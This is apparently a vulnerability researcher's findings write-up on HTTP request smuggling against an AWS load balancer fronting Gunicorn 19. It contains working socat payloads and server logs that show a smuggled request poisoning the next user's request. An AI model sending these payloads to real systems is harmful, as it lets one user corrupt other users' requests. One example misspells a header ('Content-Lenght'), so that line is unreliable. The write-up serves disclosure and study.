# AWS ALB Findings

## Summary

AWS ALB (Application Load Balancer) is vulnerable to CL.TE desync when paired with Gunicorn 19.x.
ALB forwards `Transfer-Encoding : chunked` (space before colon) to the backend, and even normalizes it
to `Transfer-Encoding: chunked` (removes the space) — so the backend sees a valid TE header while ALB
itself used Content-Length to determine request boundaries.

Target: `gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com`
Backend: Gunicorn 19.7.1

---

## ALB Header Behavior

### Normal request
```bash
curl -i http://gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com
```
```yaml
HTTP/1.1 200 OK
Server: gunicorn/19.7.1
{
  "headers": {
    "Accept": "*/*",
    "Host": "gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com",
    "User-Agent": "curl/8.7.1",
    "X-Amzn-Trace-Id": "Root=1-669c9b9f-...",
    "X-Forwarded-For": "27.60.164.20",
    "X-Forwarded-Port": "80",
    "X-Forwarded-Proto": "http"
  }
}
```

### With `Transfer-Encoding : chunked` (space)
```bash
curl -i http://gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com -H "Transfer-Encoding : chunked"
```
ALB forwards it to backend as `Transfer-Encoding: chunked` (normalized, space removed).
Backend sees and accepts the TE header.

### With both CL and TE[space]
```bash
curl -i http://gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com \
  -H "Transfer-Encoding : chunked" -H "Content-Lenght: 0"
```
Both headers forwarded. ALB uses CL, Gunicorn uses TE → desync.

---

## Local vs ALB Behavior (spelREADME notes)

### Local (direct to Gunicorn 19):
```bash
cat <(printf "POST / HTTP/1.1\r\nHost: localhost\r\nContent-Length: 5\r\nTransfer-Encoding : chunked\r\n\r\na\r\nadmin=user\r\n0\r\n\r\n") - | socat - TCP:localhost:80
```
Response body: `"body": "admin=user"` — Gunicorn parsed TE, read chunked body (0xa = 10 bytes).

### Without TE header (CL only):
Same payload without `Transfer-Encoding : chunked` → body: `"body": "a\r\nad"` (only 5 bytes per CL).

### ALB forwarding:
Same payload through ALB with CL=20 → ALB forwards everything, Gunicorn reads chunked body correctly.
With CL=5 through ALB → hangs (ALB waits for 5 bytes, gets confused by chunked format).

---

## Confirmed PoC — Desync via ALB

### Double POST (both processed):
```bash
cat <(printf "POST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\nContent-Length: 84\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nPOST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\n\r\n") - | socat - TCP:gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com:80
```
Server logs:
```
[2024-07-21 15:47:55 +0000] [9] [DEBUG] POST /
[2024-07-21 15:47:55 +0000] [9] [DEBUG] POST /
```
Two requests processed from one TCP payload.

### XXX method smuggle (victim poisoning):
```bash
cat <(printf "POST / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\nContent-Length: 83\r\nTransfer-Encoding : chunked\r\n\r\n0\r\n\r\nXXX / HTTP/1.1\r\nHost: gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com\r\n\r\n") - | socat - TCP:gunicorn-alb-1241110790.ap-south-1.elb.amazonaws.com:80
```
Server logs:
```
[2024-07-21 15:53:17 +0000] [9] [DEBUG] POST /
[2024-07-21 15:53:17 +0000] [9] [DEBUG] XXX /
[2024-07-21 15:53:17 +0000] [9] [DEBUG] Closing connection.
```
The `XXX /` is a smuggled request — next victim's request would get prepended with this.

---

## Server Log Evidence

Full reproduction with log markers:
```
[2024-07-23 01:41:06 +0000] [10] [DEBUG] GET /logbegin    ← marker before attack
[2024-07-23 01:41:11 +0000] [9] [DEBUG] POST /             ← attacker request
[2024-07-23 01:41:11 +0000] [9] [DEBUG] XXX /              ← smuggled request
[2024-07-23 01:41:11 +0000] [9] [DEBUG] Closing connection.
[2024-07-23 01:41:15 +0000] [9] [DEBUG] GET /logbegin      ← marker after attack
```

The attacker sends one TCP payload, but the backend processes two HTTP requests.
The smuggled `XXX /` would prefix the next legitimate user's request.
